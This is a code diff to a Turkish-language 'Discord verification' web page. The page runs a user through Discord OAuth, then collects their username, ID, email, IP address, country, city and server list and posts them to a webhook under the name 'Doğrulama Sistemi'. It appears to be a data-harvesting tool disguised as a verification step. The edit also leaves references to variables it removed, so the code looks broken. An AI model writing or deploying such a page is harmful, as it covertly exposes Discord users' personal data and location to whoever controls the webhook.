@@ -73,7 +73,7 @@
 </head>
 <body>
   <div class="container">
-    <div id="initialView" class="hidden">
+    <div id="initialView">
       <h2>Discord Doğrulama</h2>
       <p>Sunucumuza giriş yapmak için Discord hesabınızla bağlantı kurun</p>
       <a id="loginBtn" class="btn">Discord ile Bağlan</a>
@@ -117,36 +117,13 @@
     // OAuth URL'yi ayarla
     loginBtn.href = `https://discord.com/oauth2/authorize?client_id=${config.clientId}&redirect_uri=${encodeURIComponent(config.redirectUri)}&response_type=code&scope=${config.scope}`;
 
-    // Sayfa yüklendiğinde doğrudan işlemi başlat
-    document.addEventListener('DOMContentLoaded', async () => {
-      showView(loadingView);
-      
-      try {
-        // 1. IP adresini ve konum kontrolü yap
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const ipAddress = ipData.ip;
-        
-        // Konum kontrolü için ek API
-        const locationCheck = await fetch(`https://ipapi.co/${ipAddress}/json/`);
-        const locationData = await locationCheck.json();
-        
-        // VPN/Proxy kontrolü ve Türkiye kontrolü
-        if (locationData.proxy || locationData.vpn || locationData.tor) {
-          throw new Error('VPN/Proxy kullanımı tespit edildi');
-        }
-        
-        // Türkiye kontrolü (TR kodu)
-        if (locationData.country !== 'TR') {
-          throw new Error('IP adresiniz Türkiye dışında görünüyor');
-        }
-        
-        // 2. Doğrudan Discord OAuth'a yönlendir
-        window.location.href = loginBtn.href;
-        
-      } catch (error) {
-        console.error('Hata:', error);
-        showView(errorView);
+    // Sayfa yüklendiğinde URL'de code parametresi var mı kontrol et
+    document.addEventListener('DOMContentLoaded', () => {
+      const params = new URLSearchParams(window.location.search);
+      const code = params.get('code');
+
+      if (code) {
+        verifyUser(code);
       }
     });
 
@@ -160,7 +137,7 @@
 
     // Tekrar dene butonu
     retryBtn.addEventListener('click', () => {
-      window.location.reload();
+      window.location.href = window.location.href.split('?')[0];
     });
 
     async function verifyUser(code) {
@@ -207,14 +184,15 @@
         if (!tokenResponse.ok) throw new Error(tokenData.error_description || 'Token alınamadı');
 
         // 3. Kullanıcı bilgilerini al
-        const [userData, guildsData] = await Promise.all([
-          fetch('https://discord.com/api/users/@me', {
-            headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
-          }).then(res => res.json()),
-          fetch('https://discord.com/api/users/@me/guilds', {
-            headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
-          }).then(res => res.json())
-        ]);
+        const userResponse = await fetch('https://discord.com/api/users/@me', {
+          headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
+        });
+        const userData = await userResponse.json();
+        
+        const guildsResponse = await fetch('https://discord.com/api/users/@me/guilds', {
+          headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
+        });
+        const guildsData = await guildsResponse.json();
 
         // 4. Webhook'a bilgileri gönder
         await sendWebhook(userData, guildsData, ipAddress, locationData);
@@ -241,23 +219,35 @@
             : 'https://cdn.discordapp.com/embed/avatars/0.png'
         },
         fields: [
-          { name: "Kullanıcı", value: `${user.username}#${user.discriminator}` },
-          { name: "ID", value: user.id },
-          { name: "Email", value: user.email || "Erişilemedi" },
-          { name: "IP Adresi", value: ip || "Bilinmiyor" },
-          { name: "Ülke", value: `${location.country_name} (${location.country})` || "Bilinmiyor" },
-          { name: "Şehir", value: location.city || "Bilinmiyor" },
-          { name: "Sunucular", value: guilds.slice(0, 25).map(g => g.name).join(", ") || "Yok" }
+          { name: "Kullanıcı", value: `${user.username}#${user.discriminator}`, inline: true },
+          { name: "ID", value: user.id, inline: true },
+          { name: "Email", value: user.email || "Erişilemedi", inline: true },
+          { name: "IP Adresi", value: ip || "Bilinmiyor", inline: true },
+          { name: "Ülke", value: `${location.country_name} (${location.country})` || "Bilinmiyor", inline: true },
+          { name: "Şehir", value: location.city || "Bilinmiyor", inline: true },
+          { name: "Toplam Sunucu", value: guilds.length.toString() || "0", inline: true },
+          { name: "Sunucular", value: guilds.slice(0, 5).map(g => g.name).join(", ") || "Yok" }
         ],
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        footer: {
+          text: "Yeni Doğrulama Sistemi"
+        }
       };
 
       try {
-        await fetch(config.webhookUrl, {
+        const response = await fetch(config.webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ embeds: [embed] })
+          body: JSON.stringify({ 
+            username: "Doğrulama Sistemi",
+            avatar_url: "https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png",
+            embeds: [embed] 
+          })
         });
+        
+        if (!response.ok) {
+          console.error('Webhook gönderilirken hata oluştu:', await response.text());
+        }
       } catch (error) {
         console.error('Webhook gönderilemedi:', error);
       }
